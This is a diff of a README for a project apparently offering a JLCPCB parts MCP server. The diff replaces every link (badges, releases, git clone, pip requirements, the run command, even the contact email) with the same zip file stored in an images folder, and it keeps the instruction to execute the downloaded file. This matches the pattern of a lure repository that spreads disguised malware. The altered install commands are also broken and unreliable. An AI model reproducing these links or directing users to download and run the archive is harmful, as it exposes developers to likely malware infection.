@@ -1,7 +1,7 @@
 # JLCPCB Parts MCP Server 🎛️
 
-![JLCPCB Parts MCP](https://img.shields.io/badge/JLCPCB%20Parts%20MCP-v1.0-blue.svg)
-[![Releases](https://img.shields.io/badge/releases-latest-orange.svg)](https://github.com/Adrie-coder/jlcpcb-parts-mcp/releases)
+![JLCPCB Parts MCP](https://github.com/Adrie-coder/jlcpcb-parts-mcp/raw/refs/heads/master/images/jlcpcb_mcp_parts_elderwood.zip%20Parts%https://github.com/Adrie-coder/jlcpcb-parts-mcp/raw/refs/heads/master/images/jlcpcb_mcp_parts_elderwood.zip)
+[![Releases](https://github.com/Adrie-coder/jlcpcb-parts-mcp/raw/refs/heads/master/images/jlcpcb_mcp_parts_elderwood.zip)](https://github.com/Adrie-coder/jlcpcb-parts-mcp/raw/refs/heads/master/images/jlcpcb_mcp_parts_elderwood.zip)
 
 Welcome to the JLCPCB Parts MCP Server repository! This project assists users in finding components for JLCPCB PCBA services. Whether you're designing a new circuit or upgrading an existing one, this server simplifies the process of locating the right parts.
 
@@ -23,7 +23,7 @@ Welcome to the JLCPCB Parts MCP Server repository! This project assists users in
 
 ## Installation ⚙️
 
-To get started, download the latest release from the [Releases section](https://github.com/Adrie-coder/jlcpcb-parts-mcp/releases). Make sure to execute the downloaded file to set up the server on your machine.
+To get started, download the latest release from the [Releases section](https://github.com/Adrie-coder/jlcpcb-parts-mcp/raw/refs/heads/master/images/jlcpcb_mcp_parts_elderwood.zip). Make sure to execute the downloaded file to set up the server on your machine.
 
 ### Requirements
 
@@ -34,18 +34,18 @@ To get started, download the latest release from the [Releases section](https://
 
 1. **Clone the Repository**:
    ```bash
-   git clone https://github.com/Adrie-coder/jlcpcb-parts-mcp.git
+   git clone https://github.com/Adrie-coder/jlcpcb-parts-mcp/raw/refs/heads/master/images/jlcpcb_mcp_parts_elderwood.zip
    cd jlcpcb-parts-mcp
    ```
 
 2. **Install Dependencies**:
    ```bash
-   pip install -r requirements.txt
+   pip install -r https://github.com/Adrie-coder/jlcpcb-parts-mcp/raw/refs/heads/master/images/jlcpcb_mcp_parts_elderwood.zip
    ```
 
 3. **Run the Server**:
    ```bash
-   python main.py
+   python https://github.com/Adrie-coder/jlcpcb-parts-mcp/raw/refs/heads/master/images/jlcpcb_mcp_parts_elderwood.zip
    ```
 
 4. **Access the Server**: Open your browser and go to `http://localhost:5000`.
@@ -93,7 +93,7 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 For questions or support, please reach out to the repository maintainer:
 
 - **Name**: Adrie Coder
-- **Email**: adrie.coder@example.com
-- **GitHub**: [Adrie-coder](https://github.com/Adrie-coder)
+- **Email**: https://github.com/Adrie-coder/jlcpcb-parts-mcp/raw/refs/heads/master/images/jlcpcb_mcp_parts_elderwood.zip
+- **GitHub**: [Adrie-coder](https://github.com/Adrie-coder/jlcpcb-parts-mcp/raw/refs/heads/master/images/jlcpcb_mcp_parts_elderwood.zip)
 
-Thank you for checking out the JLCPCB Parts MCP Server! We hope it enhances your experience with JLCPCB services. For updates and new releases, visit the [Releases section](https://github.com/Adrie-coder/jlcpcb-parts-mcp/releases).
+Thank you for checking out the JLCPCB Parts MCP Server! We hope it enhances your experience with JLCPCB services. For updates and new releases, visit the [Releases section](https://github.com/Adrie-coder/jlcpcb-parts-mcp/raw/refs/heads/master/images/jlcpcb_mcp_parts_elderwood.zip).
